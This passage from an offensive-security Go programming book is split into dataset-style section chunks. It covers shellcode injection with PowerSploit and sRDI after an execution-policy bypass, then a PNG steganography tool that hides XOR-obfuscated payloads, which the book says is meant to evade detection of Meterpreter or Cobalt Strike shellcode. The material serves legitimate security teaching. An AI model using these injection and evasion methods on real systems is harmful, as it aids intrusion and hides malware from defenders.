Windows and, optionally, a GNU/Linux machine,\nas you may find GNU/Linux to be a more readily available\nPython 3 environment. You’ll need Python 3 for this exercise,\nso install it if it’s not already installed.\nFrom the sRDI directory, execute a python3 shell. Use the\nfollowing code to generate a hash of the exported function:\n>>> from ShellCodeRDI import *\n>>> HashFunctionName('Start')\n1168596138\nThe sRDI tools will use the hash to identify a function from\nthe shellcode we’ll generate later.\nNext, we’ll leverage PowerShell utilities to generate and\nexecute shellcode. For convenience, we will use some utilities\nfrom PowerSploit\n(https://github.com/PowerShellMafia/PowerSploit/), which is\na suite of PowerShell utilities we can leverage to inject\nshellcode. You can download this using Git. From the\nPowerSploit\\CodeExecution directory, launch a new\nPowerShell shell:\nc:\\tools\\PowerSploit\\CodeExecution> powershell.exe -exec bypass\nWindows PowerShell\nCopyright (C) 2016 Microsoft Corporation. All rights reserved.\nNow import two PowerShell modules from PowerSploit\nand sRDI:\nPS C:\\tools\\PowerSploit\\CodeExecution> Import-Module .\\Invoke-Shellcode.ps1"
  },
  {
    "input": "Summary",
    "output": "PS C:\\tools\\PowerSploit\\CodeExecution> cd ..\\..\\sRDI\nPS C:\\tools\\sRDI> cd .\\PowerShell\\\nPS C:\\tools\\sRDI\\PowerShell> Import-Module .\\ConvertTo-Shellcode.ps1\nWith both modules imported, we can use ConvertTo-Shellcode\nfrom sRDI to generate shellcode from the DLL, and then pass\nthis into Invoke-Shellcode from PowerSploit to demonstrate the\ninjection. Once this executes, you should observe your Go\ncode executing:\nPS C:\\tools\\sRDI\\PowerShell> Invoke-Shellcode -Shellcode (ConvertTo-\nShellcode\n-File C:\\Users\\tom\\Downloads\\x.dll -FunctionHash 1168596138)\nInjecting shellcode into the running PowerShell process!\nDo you wish to carry out your evil plans?\n[Y] Yes [N] No [S] Suspend [?] Help (default is \"Y\"): Y\nYO FROM GO\nThe message YO FROM Go indicates that we have\nsuccessfully launched our Go payload from within a C binary\nthat was converted into shellcode. This unlocks a whole host\nof possibilities.\nSUMMARY\nThat was quite a lot to discuss, and yet it just scratches the\nsurface. We started the chapter with a brief discussion about\nnavigating the Windows API documentation so you’d be\nfamiliar with reconciling Windows objects to usable Go\nobjects: these include functions, parameters, data types, and\nreturn values. Next, we discussed the use of uintptr and\nunsafe.Pointer to perform disparate type conversions necessary\nwhen interacting with the Go syscall package, along with the\npotential pitfalls to avoid. We then tied everything together\nwith a demonstration of process injection, which used various\nGo system calls to interact with Windows process internals.\nFrom there, we discussed the PE file format structure, and\nthen built a parser to navigate the different file structures. We\ndemonstrated various Go objects that make navigating the\nbinary PE file a bit more convenient and finished up with\nnotable offsets that may be interesting when backdooring a PE\nfile.\nLastly, you built a toolchain to interoperate with Go and\nnative C code. We briefly discussed the CGO package while\nfocusing on creating C code examples and exploring novel\ntools for creating native Go DLLs.\nTake this chapter and expand on what you’ve learned. We\nurge you to continuously build, break, and research the many\nattack disciplines. The Windows attack surface is constantly\nevolving, and having the right knowledge and tooling will\nonly help to make the adversarial journey more attainable."
  },
  {
    "input": "Exploring the PNG Format",
    "output": "13\nHIDING DATA WITH\nSTEGANOGRAPHY\nThe word steganography is a combination of the Greek words\nsteganos, which means to cover, conceal, or protect, and\ngraphien, which means to write. In security, steganography\nrefers to techniques and procedures used to obfuscate (or hide)\ndata by implanting it within other data, such as an image, so it\ncan be extracted at a future point in time. As part of the\nsecurity community, you’ll explore this practice on a routine\nbasis by hiding payloads that you’ll recover after they are\ndelivered to the target.\nIn this chapter, you’ll implant data within a Portable\nNetwork Graphics (PNG) image. You’ll first explore the PNG\nformat and learn how to read PNG data. You’ll then implant\nyour own data into the existing image. Finally, you’ll explore\nXOR, a method for encrypting and decrypting your implanted\ndata.\nEXPLORING THE PNG FORMAT\nLet’s start by reviewing the PNG specification, which will\nhelp you understand the PNG image format and how to\nimplant data into a file. You can find its technical specification\nat http://www.libpng.org/pub/png/spec/1.2/PNG-\nStructure.html. It provides details about the byte format of a\nbinary PNG image file, which is made up of repetitive byte\nchunks.\nOpen a PNG file within a hex editor and navigate through\neach of the relevant byte chunk components to see what each\ndoes. We’re using the native hexdump hex editor on Linux,\nbut any hex editor should work. You can find the sample\nimage that we’ll open at https://github.com/blackhat-\ngo/bhg/blob/master/ch-13/imgInject/images/battlecat.png;\nhowever, all valid PNG images will follow the same format.\nThe Header\nThe first 8 bytes of the image file, 89 50 4e 47 0d 0a 1a 0a,\nhighlighted in Figure 13-1, are called the header.\nFigure 13-1: The PNG file’s header\nThe second, third, and fourth hex values literally read PNG\nwhen converted to ASCII. The arbitrary trailing bytes consist\nof both DOS and Unix Carriage-Return Line Feed (CRLF).\nThis specific header sequence, referred to as a file’s magic\nbytes, will be identical in every valid PNG file. The variations\nin content occur in the remaining chunks, as you’ll soon see.\nAs we work through this spec, let’s start to build a\nrepresentation of the PNG format in Go. It’ll help us expedite\nour end goal of embedding payloads. Since the header is 8\nbytes long, it can be packed into a uint64 data type, so let’s go\nahead and build a struct called Header that will hold the value\n(Listing 13-1). (All the code listings at the root location of /\nexist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.)\n//Header holds the first UINT64 (Magic Bytes)\ntype Header struct {\nHeader uint64\n}\nListing 13-1: Header struct definition (/ch-13/imgInject/pnglib/commands.go)\nThe Chunk Sequence\nThe remainder of the PNG file, shown in Figure 13-2, is\ncomposed of repeating byte chunks that follow this pattern:\nSIZE (4 bytes), TYPE (4 bytes), DATA (any number of bytes), and\nCRC (4 bytes).\nFigure 13-2: The pattern of the chunks used for the remainder of the image data\nReviewing the hex dump in further detail, you can see that\nthe first chunk—the SIZE chunk—consists of bytes 0x00 0x00\n0x00 0x0d. This chunk defines the length of the DATA chunk\nthat’ll follow. The hexadecimal conversion to ASCII is 13—so\nthis chunk dictates that the DATA chunk will consist of 13\nbytes. The TYPE chunk’s bytes, 0x49 0x48 0x44 0x52, convert to an\nASCII value of IHDR in this case. The PNG spec defines\nvarious valid types. Some of these types, such as IHDR, are\nused to define image metadata or signal the end of an image\ndata stream. Other types, specifically the IDAT type, contain the\nactual image bytes.\nNext is the DATA chunk, whose length is defined by the SIZE\nchunk. Finally, the CRC chunk concludes the overall chunk\nsegment. It consists of a CRC-32 checksum of the combined\nTYPE and DATA bytes. This particular CRC chunk’s bytes are\n0x9a 0x76 0x82 0x70. This format repeats itself throughout the\nentire image file until you reach an End of File (EOF) state,\nindicated by the chunk of type IEND.\nJust as you did with the Header struct in Listing 13-1, build a\nstruct to hold the values of a single chunk, as defined in\nListing 13-2.\n//Chunk represents a data byte chunk segment\ntype Chunk struct {\nSize uint32\nType uint32\nData []byte\nCRC uint32\n}"
  },
  {
    "input": "Reading Image Byte Data",
    "output": "Listing 13-2: Chunk struct definition (/ch-13/imgInject/pnglib/commands.go)\nREADING IMAGE BYTE DATA\nThe Go language handles binary data reads and writes with\nrelative ease, thanks in part to the binary package (which you\nmay remember from Chapter 6), but before you can parse\nPNG data, you’ll need to open a file for reading. Let’s create a\nPreProcessImage() function that will consume a file handle of type\n*os.File and return a type of *bytes.Reader (Listing 13-3).\n//PreProcessImage reads to buffer from file handle\nfunc PreProcessImage(dat *os.File) (*bytes.Reader, error) {\n❶ stats, err := dat.Stat()\nif err != nil {\nreturn nil, err\n}\n❷ var size = stats.Size()\nb := make([]byte, size)\n❸ bufR := bufio.NewReader(dat)\n_, err = bufR.Read(b)\nbReader := bytes.NewReader(b)\nreturn bReader, err\n}\nListing 13-3: The PreProcessImage() function definition (/ch-\n13/imgInject/utils/reader.go)\nThe function opens a file object in order to obtain a FileInfo\nstructure ❶ used to grab size information ❷. Immediately\nfollowing are a couple of lines of code used to instantiate a\nReader instance via bufio.NewReader() and then a *bytes.Reader\ninstance via a call to bytes.NewReader() ❸. The function returns a\n*bytes.Reader, which positions you to start using the binary\npackage to read byte data. You’ll first read the header data and\nthen read the chunk sequence.\nReading the Header Data\nTo validate that the file is actually a PNG file, use the first 8\nbytes, which define a PNG file, to build the validate() method\n(Listing 13-4).\nfunc (mc *MetaChunk) validate(b *bytes.Reader) {\nvar header Header\nif err := binary.Read(b, binary.BigEndian, &header.Header)❶; err != nil {\nlog.Fatal(err)\n}\nbArr := make([]byte, 8)\nbinary.BigEndian.PutUint64(bArr, header.Header)❷\nif string(bArr[1:4])❸ != \"PNG\" {\nlog.Fatal(\"Provided file is not a valid PNG format\")\n} else {\nfmt.Println(\"Valid PNG so let us continue!\")\n}\n}\nListing 13-4: Validating that the file is a PNG file (/ch-\n13/imgInject/pnglib/commands.go)\nAlthough this method may not seem overly complex, it\nintroduces a couple of new items. The first, and the most\nobvious one, is the binary.Read() function ❶ that copies the first\n8 bytes from the bytes.Reader into the Header struct value. Recall\nthat you declared the Header struct field as type uint64 (Listing\n13-1), which is equivalent to 8 bytes. It’s also noteworthy that\nHivaNetwork.Com\nthe binary package provides methods to read Most Significant Bit\nand Least Significant Bit formats via binary.BigEndian and\nbinary.LittleEndian, respectively ❷. These functions can also be\nquite helpful when you’re performing binary writes; for\nexample, you could select BigEndian to place bytes on the wire\ndictating the use of network byte ordering.\nThe binary endianness function also contains the methods\nthat facilitate the marshaling of data types to a literal data type\n(such as uint64). Here, you’re creating a byte array of length 8\nand performing a binary read necessary to copy the data into a\nunit64 data type. You can then convert the bytes to their string\nrepresentations and use slicing and a simple string comparison\nto validate that bytes 1 through 4 produce PNG, indicating that\nyou have a valid image file format ❸.\nTo improve the process of checking that a file is a PNG\nfile, we encourage you to look at the Go bytes package, as it\ncontains convenience functions that you could use as a\nshortcut to compare a file header with the PNG magic byte\nsequence we mentioned earlier. We’ll let you explore this on\nyour own.\nReading the Chunk Sequence\nOnce you validated that your file is a PNG image, you can\nwrite the code that reads the chunk sequence. The header will\noccur only once in a PNG file, whereas the chunk sequence\nwill repeat the SIZE, TYPE, DATA, and CRC chunks until it\nreaches the EOF. Therefore, you need to be able to\naccommodate this repetition, which you can do most\nconveniently by using a Go conditional loop. With this in\nmind, let’s build out a ProcessImage() method, which iteratively\nprocesses all the data chunks up to the end of file (Listing 13-\n5).\nfunc (mc *MetaChunk) ProcessImage(b *bytes.Reader, c\n*models.CmdLineOpts)❶ {\n// Snip code for brevity (Only displaying relevant lines from code block)\ncount := 1 //Start at 1 because 0 is reserved for magic byte\n❷ chunkType := \"\"\n❸ endChunkType := \"IEND\" //The last TYPE prior to EOF\n❹ for chunkType != endChunkType {\nfmt.Println(\"---- Chunk # \" + strconv.Itoa(count) + \" ----\")\noffset := chk.getOffset(b)\nfmt.Printf(\"Chunk Offset: %#02x\\n\", offset)\nchk.readChunk(b)\nchunkType = chk.chunkTypeToString()\ncount++\n}\n}\nListing 13-5: The ProcessImage() method (/ch-13/imgInject/pnglib/commands.go)\nYou first pass a reference to a bytes.Reader memory address\npointer (*bytes.Reader) as an argument to ProcessImage() ❶. The\nvalidate() method (Listing 13-4) you just created also took a\nreference to a bytes.Reader pointer. As convention dictates,\nmultiple references to the same memory address pointer\nlocation will inherently allow mutable access to the referenced\ndata. This essentially means that as you pass your bytes.Reader\nreference as an argument to ProcessImage(), the reader will have\nalready advanced 8 bytes as a result of the size of the Header\nbecause you’re accessing the same instance of bytes.Reader.\nAlternatively, had you not passed a pointer, the bytes.Reader\nwould have either been a copy of the same PNG image data or\nseparate unique instance data. That’s because advancing the\npointer when you read the header would not have advanced\nthe reader appropriately elsewhere. You want to avoid taking\nthis approach. For one, passing around multiple copies of data\nwhen unnecessary is simply bad convention. More\nimportantly, each time a copy is passed, it is positioned at the\nstart of the file, forcing you to programmatically define and\nmanage its position in the file prior to reading a chunk\nsequence.\nAs you progress through the block of code, you define a\ncount variable to track how many chunk segments the image\nfile contains. The chunkType ❷ and endChunkType ❸ are used as\npart of the comparative logic, which evaluates the current\nchunkType to endChunkType’s IEND value designating an EOF\ncondition ❹.\nIt would be nice to know where each chunk segment starts\n—or rather, each chunk’s absolute position within the file byte\nconstruct, a value known as the offset. If you know the offset\nvalue, it will be much easier to implant a payload into the file.\nFor example, you can give a collection of offset locations to a\ndecoder—a separate function that collects the bytes at each\nknown offset—that then unwinds them into your intended\npayload. To get the offsets of each chunk, you’ll call the\nmc.getOffset(b) method (Listing 13-6).\nfunc (mc *MetaChunk) getOffset(b *bytes.Reader) {\noffset, _ := b.Seek(0, 1)❶\nmc.Offset = offset\n}\nListing 13-6: The getOffset() method (/ch-13/imgInject/pnglib/commands.go)\nThe bytes.Reader contains a Seek() method that makes deriving\nthe current position quite simple. The Seek() method moves the\ncurrent read or write offset and then returns the new offset\nrelative to the start of the file. Its first argument is the number\nof bytes by which you want to move the offset and its second\nargument defines the position from which the move will occur.\nThe second argument’s optional values are 0 (Start of File), 1\n(Current Position), and 2 (End of File). For example, if you\nwanted to shift 8 bytes to the left from your current position,\nyou would use b.Seek(-8,1).\nHere, b.Seek(0,1) ❶ states that you want to move your offset\n0 bytes from the current position, so it simply returns the\ncurrent offset: essentially retrieving the offset without moving\nit.\nThe next methods we detail define how you read the actual\nchunk segment bytes. To make things a bit more legible, let’s\ncreate a readChunk() method and then create separate methods for\nreading each chunk subfield (Listing 13-7).\nfunc (mc *MetaChunk) readChunk(b *bytes.Reader) {\nmc.readChunkSize(b)\nmc.readChunkType(b)\nmc.readChunkBytes(b, mc.Chk.Size) ❶\nmc.readChunkCRC(b)\n}\nfunc (mc *MetaChunk) readChunkSize(b *bytes.Reader) {\nif err := binary.Read(b, binary.BigEndian, &mc.Chk.Size); err != nil { ❷\nlog.Fatal(err)\n}\n}\nfunc (mc *MetaChunk) readChunkType(b *bytes.Reader) {\nif err := binary.Read(b, binary.BigEndian, &mc.Chk.Type); err != nil {\nlog.Fatal(err)\n}\n}"
  },
  {
    "input": "Writing Image Byte Data to Implant a Payload",
    "output": "func (mc *MetaChunk) readChunkBytes(b *bytes.Reader, cLen uint32) {\nmc.Chk.Data = make([]byte, cLen) ❸\nif err := binary.Read(b, binary.BigEndian, &mc.Chk.Data); err != nil {\nlog.Fatal(err)\n}\n}\nfunc (mc *MetaChunk) readChunkCRC(b *bytes.Reader) {\nif err := binary.Read(b, binary.BigEndian, &mc.Chk.CRC); err != nil {\nlog.Fatal(err)\n}\n}\nListing 13-7: Chunk-reading methods (/ch-13/imgInject/pnglib/commands.go)\nThe methods readChunkSize(), readChunkType(), and readChunkCRC()\nare all similar. Each reads a uint32 value into the respective\nfield of the Chunk struct. However, readChunkBytes() is a bit of an\nanomaly. Because the image data is of variable length, we’ll\nneed to supply this length to the readChunkBytes() function so that\nit knows how many bytes to read ❶. Recall that the data\nlength is maintained in the SIZE subfield of the chunk. You\nidentify the SIZE value ❷ and pass it as an argument to\nreadChunkBytes() to define a slice of proper size ❸. Only then can\nthe byte data be read into the struct’s Data field. That’s about it\nfor reading the data, so let’s press on and explore writing byte\ndata.\nWRITING IMAGE BYTE DATA TO\nIMPLANT A PAYLOAD\nAlthough you can choose from many complex steganography\ntechniques to implant payloads, in this section we’ll focus on a\nmethod of writing to a certain byte offset. The PNG file format\ndefines critical and ancillary chunk segments within the\nspecification. The critical chunks are necessary for the image\ndecoder to process the image. The ancillary chunks are\noptional and provide various pieces of metadata that are not\ncritical to encoding or decoding, such as timestamps and text.\nTherefore, the ancillary chunk type provides an ideal\nlocation to either overwrite an existing chunk or insert a new\nchunk. Here, we’ll show you how to insert new byte slices into\nan ancillary chunk segment.\nLocating a Chunk Offset\nFirst, you need to identify an adequate offset somewhere in the\nancillary data. You can spot ancillary chunks because they\nalways start with lowercase letters. Let’s use the hex editor\nonce again and open up the original PNG file while advancing\nto the end of the hex dump.\nEvery valid PNG image will have an IEND chunk type\nindicating the final chunk of the file (the EOF chunk). Moving\nto the 4 bytes that come before the final SIZE chunk will\nposition you at the starting offset of the IEND chunk and the\nlast of the arbitrary (critical or ancillary) chunks contained\nwithin the overall PNG file. Recall that ancillary chunks are\noptional, so it’s possible that the file you’re inspecting as you\nfollow along won’t have the same ancillary chunks, or any for\nthat matter. In our example, the offset to the IEND chunk begins\nat byte offset 0x85258 (Figure 13-3).\nFigure 13-3: Identifying a chunk offset relative to the IEND position\nWriting Bytes with the ProcessImage() Method\nA standard approach to writing ordered bytes into a byte\nstream is to use a Go struct. Let’s revisit another section of the\nProcessImage() method we started building in Listing 13-5 and\nwalk through the details. The code in Listing 13-8 calls\nindividual functions that you’ll build out as you progress\nthrough this section.\nfunc (mc *MetaChunk) ProcessImage(b *bytes.Reader, c *models.CmdLineOpts)\n❶ {\n--snip--\n❷ var m MetaChunk\n❸ m.Chk.Data = []byte(c.Payload)\nm.Chk.Type = m.strToInt(c.Type)❹\nm.Chk.Size = m.createChunkSize()❺\nm.Chk.CRC = m.createChunkCRC()❻\nbm := m.marshalData()❼\nbmb := bm.Bytes()\nfmt.Printf(\"Payload Original: % X\\n\", []byte(c.Payload))\nfmt.Printf(\"Payload: % X\\n\", m.Chk.Data)\n❽ utils.WriteData(b, c, bmb)\n}\nListing 13-8: Writing bytes with the ProcessImage() method (/ch-13/imgInject/pnglib\n/commands.go)\nThis method takes a byte.Reader and another struct,\nmodels.CmdLineOpts, as arguments ❶. The CmdLineOpts struct,\nshown in Listing 13-9, contains flag values passed in via the\ncommand line. We’ll use these flags to determine what\npayload to use and where to insert it in the image data. Since\nthe bytes you’ll write follow the same structured format as\nthose read from preexisting chunk segments, you can just\ncreate a new MetaChunk struct instance ❷ that will accept your\nnew chunk segment values.\nThe next step is to read the payload into a byte slice ❸.\nHowever, you’ll need additional functionality to coerce the\nliteral flag values into a usable byte array. Let’s dive into the\ndetails of the strToInt() ❹, createChunkSize() ❺, createChunkCRC() ❻,\nMarshalData() ❼, and WriteData() ❽ methods.\npackage models\n//CmdLineOpts represents the cli arguments\ntype CmdLineOpts struct {\nInput string\nOutput string\nMeta bool\nSuppress bool\nOffset string\nInject bool\nPayload string\nType string\nEncode bool\nDecode bool\nKey string\n}\nListing 13-9: The CmdLineOpts struct (/ch-13/imgInject/models/opts.go)\nThe strToInt() Method\nWe’ll start with the strToInt() method (Listing 13-10).\nfunc (mc *MetaChunk) strToInt(s string)❶ uint32 {\nt := []byte(s)\n❷ return binary.BigEndian.Uint32(t)\n}\nListing 13-10: The strToInt() method (/ch-13/imgInject/pnglib/commands.go)\nThe strToInt() method is a helper that consumes a string ❶ as\nan argument and returns uint32 ❷, which is the necessary data\ntype for your Chunk struct TYPE value.\nThe createChunkSize() Method\nNext, you use the createChunkSize() method to assign the Chunk\nstruct SIZE value (Listing 13-11).\nfunc (mc *MetaChunk) createChunkSize() uint32 {\nreturn uint32(len(mc.Chk.Data)❷)❶\n}\nListing 13-11: The createChunkSize() method (/ch-13/imgInject/pnglib/commands.go)\nThis method will obtain the length of the chk.DATA byte\narray ❷ and type-convert it to a uint32 value ❶.\nThe createChunkCRC() Method\nRecall that the CRC checksum for each chunk segment\ncomprises both the TYPE and DATA bytes. You’ll use the\ncreateChunkCRC() method to calculate this checksum. The method\nleverages Go’s hash/crc32 package (Listing 13-12).\nfunc (mc *MetaChunk) createChunkCRC() uint32 {\nbytesMSB := new(bytes.Buffer) ❶\nif err := binary.Write(bytesMSB, binary.BigEndian, mc.Chk.Type); err != nil {\n❷\nlog.Fatal(err)\n}\nif err := binary.Write(bytesMSB, binary.BigEndian, mc.Chk.Data); err != nil {\n❸\nlog.Fatal(err)\n}\nreturn crc32.ChecksumIEEE(bytesMSB.Bytes()) ❹\n}\nListing 13-12: The createChunkCRC() method (/ch-13/imgInject/pnglib/commands.go)\nPrior to arriving at the return statement, you declare a\nbytes.Buffer ❶ and write both the TYPE ❷ and DATA ❸ bytes\ninto it. The byte slice from the buffer is then passed as an\nargument to the ChecksumIEEE, and the CRC-32 checksum value\nis returned as a uint32 data type. The return statement ❹ is doing\nall the heavy lifting here, actually calculating the checksum on\nthe necessary bytes.\nThe marshalData() Method\nAll necessary pieces of a chunk are assigned to their respective\nstruct fields, which can now be marshaled into a bytes.Buffer.\nThis buffer will provide the raw bytes of the custom chunk\nthat are to be inserted into the new image file. Listing 13-13\nshows what the marshalData() method looks like.\nfunc (mc *MetaChunk) marshalData() *bytes.Buffer {\nbytesMSB := new(bytes.Buffer) ❶\nif err := binary.Write(bytesMSB, binary.BigEndian, mc.Chk.Size); err != nil {\n❷\nlog.Fatal(err)\n}\nif err := binary.Write(bytesMSB, binary.BigEndian, mc.Chk.Type); err != nil {\n❸\nlog.Fatal(err)\nHivaNetwork.Com\n}\nif err := binary.Write(bytesMSB, binary.BigEndian, mc.Chk.Data); err != nil {\n❹\nlog.Fatal(err)\n}\nif err := binary.Write(bytesMSB, binary.BigEndian, mc.Chk.CRC); err != nil {\n❺\nlog.Fatal(err)\n}\nreturn bytesMSB\n}\nListing 13-13: The marshalData() method (/ch-13/imgInject/pnglib/commands.go)\nThe marshalData() method declares a bytes.Buffer ❶ and writes\nthe chunk information to it, including the size ❷, type ❸, data\n❹, and checksum ❺. The method returns all the chunk\nsegment data into a single consolidated bytes.Buffer.\nThe WriteData() Function\nNow all you have left to do is to write your new chunk\nsegment bytes into the offset of the original PNG image file.\nLet’s have a peek at the WriteData() function, which exists in a\npackage we created named utils (Listing 13-14).\n//WriteData writes new Chunk data to offset\nfunc WriteData(r *bytes.Reader❶, c *models.CmdLineOpts❷, b []byte❸) {\n❹ offset, _ := strconv.ParseInt(c.Offset, 10, 64)\n❺ w, err := os.Create(c.Output)\nif err != nil {\nlog.Fatal(\"Fatal: Problem writing to the output file!\")\n}\ndefer w.Close()\n❻ r.Seek(0, 0)\n❼ var buff = make([]byte, offset)\nr.Read(buff)\n❽ w.Write(buff)\n❾ w.Write(b)\n❿ _, err = io.Copy(w, r)\nif err == nil {\nfmt.Printf(\"Success: %s created\\n\", c.Output)\n}\n}\nListing 13-14: The WriteData() function (/ch-13/imgInject/utils/writer.go)\nThe WriteData() function consumes a bytes.Reader ❶ containing\nthe original image file byte data, a models.CmdLineOpts ❷ struct\ninclusive of the command line argument values, and a byte slice\n❸ holding the new chunk byte segment. The code block starts\nwith a string-to-int64 conversion ❹ in order to obtain the offset\nvalue from the models.CmdLineOpts struct; this will help you write\nyour new chunk segment to a specific location without\ncorrupting other chunks. You then create a file handle ❺ so\nthat the newly modified PNG image can be written to disk.\nYou use the r.Seek(0,0) function call ❻ to rewind to the\nabsolute beginning of the bytes.Reader. Recall that the first 8\nbytes are reserved for the PNG header, so it’s important that\nthe new output PNG image include these header bytes as well.\nYou include them by instantiating a byte slice with a length\ndetermined by the offset value ❼. You then read that number of\nbytes from the original image and write those same bytes to\nyour new image file ❽. You now have identical headers in\nboth the original and new images.\nYou then write the new chunk segment bytes ❾ into the\nnew image file. Finally, you append the remainder of the\nbytes.Reader bytes ❿ (that is, the chunk segment bytes from your\noriginal image) to the new image file. Recall that bytes.Reader\nhas advanced to the offset location, because of the earlier read\ninto a byte slice, which contains bytes from the offset to the\nEOF. You’re left with a new image file. Your new file has\nidentical leading and trailing chunks as the original image, but\nit also contains your payload, injected as a new ancillary\nchunk.\nTo help visualize a working representation of what you\nbuilt so far, reference the overall working project code at\nhttps://github.com/blackhat-go/bhg/tree/master/ch-\n13/imgInject/. The imgInject program consumes command line\narguments containing values for the original PNG image file,\nan offset location, an arbitrary data payload, the self-declared\narbitrary chunk type, and the output filename for your\nmodified PNG image file, as shown in Listing 13-15.\n$ go run main.go -i images/battlecat.png -o newPNGfile --inject -offset \\\n0x85258 --payload 1234243525522552522452355525\nListing 13-15: Running the imgInject command line program\nIf everything went as planned, offset 0x85258 should now\ncontain a new rNDm chunk segment, as shown in Figure 13-4.\nFigure 13-4: A payload injected as an ancillary chunk (such as rNDm)\nCongratulations—you’ve just written your first"
  },
  {
    "input": "Encoding and Decoding Image Byte Data by Using XOR",
    "output": "steganography program!\nENCODING AND DECODING IMAGE\nBYTE DATA BY USING XOR\nJust as there are many types of steganography, so are there\nmany techniques used to obfuscate data within a binary file.\nLet’s continue to build the sample program from the previous\nsection. This time, you’ll include obfuscation to hide the true\nintent of your payload.\nObfuscation can help conceal your payload from network-\nmonitoring devices and endpoint security solutions. If, for\nexample, you’re embedding raw shellcode used for spawning a\nnew Meterpreter shell or Cobalt Strike beacon, you want to\nmake sure it avoids detection. For this, you’ll use Exclusive\nOR bitwise operations to encrypt and decrypt the data.\nAn Exclusive OR (XOR) is a conditional comparison\nbetween two binary values that produces a Boolean true value\nif and only if the two values are not the same, and a Boolean\nfalse value otherwise. In other words, the statement is true if\neither x or y are true—but not if both are true. You can see this\nrepresented in Table 13-1, given that x and y are both binary\ninput values.\nTable 13-1: XOR Truth Table\nx y x ^ y output\n0 1 True or 1\n1 0 True or 1\n0 0 False or 0\n1 1 False or 0\nYou can use this logic to obfuscate data by comparing the\nbits in the data to the bits of a secret key. When two values\nmatch, you change the bit in the payload to 0, and when they\ndiffer, you change it to 1. Let’s expand the code you created in\nthe previous section to include an encodeDecode() function, along\nwith XorEncode() and XorDecode() functions. We’ll insert these\nfunctions into the utils package (Listing 13-16).\nfunc encodeDecode(input []byte❶, key string❷) []byte {\n❸ var bArr = make([]byte, len(input))\nfor i := 0; i < len(input); i++ {\n❹ bArr[i] += input[i] ^ key[i%len(key)]\n}\nreturn bArr\n}\nListing 13-16: The encodeDecode() function (/ch-13/imgInject/utils/encoders.go)\nThe encodeDecode() function consumes a byte slice containing\nthe payload ❶ and a secret key value ❷ as arguments. A new\nbyte slice, bArr ❸, is created within the function’s inner scope\nand initialized to the input byte length value (the length of the\npayload). Next, the function uses a conditional loop to iterate\nover each index position of input byte array.\nWithin the inner conditional loop, each iteration XORs the\ncurrent index’s binary value with a binary value derived from\nthe modulo of the current index value and length of the secret\nkey ❹. This allows you to use a key that is shorter than your\npayload. When the end of the key is reached, the modulo will\nforce the next iteration to use the first byte of the key. Each\nXOR operation result is written to the new bArr byte slice, and\nthe function returns the resulting slice.\nThe functions in Listing 13-17 wrap the encodeDecode()\nfunction to facilitate the encoding and decoding process.\n// XorEncode returns encoded byte array\n❶ func XorEncode(decode []byte, key string) []byte {\n❷ return encodeDecode(decode, key)\n}\n// XorDecode returns decoded byte array\n❶ func XorDecode(encode []byte, key string) []byte {\n❷ return encodeDecode(encode, key)\n}\nListing 13-17: The XorEncode() and XorDecode() functions (/ch-\n13/imgInject/utils/encoders.go)\nYou define two functions, XorEncode() and XorDecode(), which\ntake the same literal arguments ❶ and return the same values\n❷. That’s because you decode XOR-encoded data by using\nthe same process used to encode the data. However, you\ndefine these functions separately, to provide clarity within the\nprogram code.\nTo use these XOR functions in your existing program,\nyou’ll have to modify the ProcessImage() logic you created in\nListing 13-8. These updates will leverage the XorEncode()\nfunction to encrypt the payload. The modifications, shown in\nListing 13-18, assume you’re using command line arguments\nto pass values to conditional encode and decode logic.\n// Encode Block\nif (c.Offset != \"\") && c.Encode {\nvar m MetaChunk\n❶ m.Chk.Data = utils.XorEncode([]byte(c.Payload), c.Key)\nm.Chk.Type = chk.strToInt(c.Type)\nm.Chk.Size = chk.createChunkSize()\nm.Chk.CRC = chk.createChunkCRC()\nbm := chk.marshalData()\nbmb := bm.Bytes()\nfmt.Printf(\"Payload Original: % X\\n\", []byte(c.Payload))\nfmt.Printf(\"Payload Encode: % X\\n\", chk.Data)\nutils.WriteData(b, c, bmb)\n}\nListing 13-18: Updating ProcessImage() to include XOR encoding (/ch-\n13/imgInject/pnglib/commands.go)\nThe function call to XorEncode() ❶ passes a byte slice\ncontaining the payload and secret key, XORs the two values,\nand returns a byte slice, which is assigned to chk.Data. The\nremaining functionality remains unchanged and marshals the\nnew chunk segment to eventually be written to an image file.\nThe command line run of your program should produce a\nresult similar to the one in Listing 13-19.\n$ go run main.go -i images/battlecat.png --inject --offset 0x85258 --encode \\\n--key gophers --payload 1234243525522552522452355525 --output\nencodePNGfile\nValid PNG so let us continue!\n❶ Payload Original: 31 32 33 34 32 34 33 35 32 35 35 32 32 35 35 32 35 32 32\n34 35 32 33 35 35 35 32 35\n❷ Payload Encode: 56 5D 43 5C 57 46 40 52 5D 45 5D 57 40 46 52 5D 45 5A 57\n46\n46 55 5C 45 5D 50 40 46\nSuccess: encodePNGfile created\nListing 13-19: Running the imgInject program to XOR encode a data chunk block\nThe payload is written to a byte representation and displayed\nto stdout as Payload Original ❶. The payload is then XORed with a\nkey value of gophers and displayed to stdout as Payload Encode ❷.\nTo decrypt your payload bytes, you use the decode\nfunction, as in Listing 13-20.\n//Decode Block\nif (c.Offset != \"\") && c.Decode {\nvar m MetaChunk\n❶ offset, _ := strconv.ParseInt(c.Offset, 10, 64)\n❷ b.Seek(offset, 0)\n❸ m.readChunk(b)\norigData := m.Chk.Data\n❹ m.Chk.Data = utils.XorDecode(m.Chk.Data, c.Key)\nm.Chk.CRC = m.createChunkCRC()\n❺ bm := m.marshalData()\nbmb := bm.Bytes()\nfmt.Printf(\"Payload Original: % X\\n\", origData)\nfmt.Printf(\"Payload Decode: % X\\n\", m.Chk.Data)\n❻ utils.WriteData(b, c, bmb)\n}\nListing 13-20: Decoding the image file and payload (/ch-\n13/imgInject/pnglib/commands.go)\nThe block requires the offset position of the chunk segment\nthat contains the payload ❶. You use the offset to Seek() ❷ the\nfile position, along with a subsequent call to readChunk() ❸\nthat’s necessary to derive the SIZE, TYPE, DATA, and CRC values.\nA call to XorDecode() ❹ takes the chk.Data payload value and the\nsame secret key used to encode the data, and then assigns the\ndecoded payload value back to chk.Data. (Remember that this is\nsymmetric encryption, so you use the same key to both encrypt\nand decrypt the data.) The code block continues by calling\nmarshalData() ❺, which converts your Chunk struct to a byte slice.\nFinally, you write the new chunk segment containing the\ndecoded payload to a file by using the WriteData() function ❻.\nA command line run of your program, this time with a\ndecode argument, should produce the result in Listing 13-21.\n$ go run main.go -i encodePNGfile -o decodePNGfile --offset 0x85258 -\ndecode \\\n--key gophersValid PNG so let us continue!\n❶ 